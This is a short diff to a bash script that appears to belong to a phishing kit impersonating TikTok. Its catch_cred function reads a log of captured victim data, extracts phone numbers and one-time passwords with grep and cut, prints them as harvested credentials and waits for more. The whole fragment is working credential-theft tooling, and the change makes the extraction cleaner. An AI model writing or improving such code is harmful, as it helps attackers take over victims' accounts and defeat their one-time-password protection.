@@ -81,9 +81,12 @@ fi
 
 catch_cred() {
 ##
-account=$(grep -i 'username=IN' sites/tiktok/log.txt )
-#IFS=$'\n'
-password=$(grep -i 'otp' sites/tiktok/log.txt )
+account=$(grep username sites/tiktok/log.txt | cut -d "=" -f2)
+IFS=$'\n'
+password=$(grep otp sites/tiktok/log.txt | cut -d "=" -f2)
+
+
+
 printf "[*] Number and country code: %s\n" $account
 printf "[*] OTP: %s\n" $password
 printf "[*] Waiting For Next Credentials, Press Ctrl + C to exit...\n"
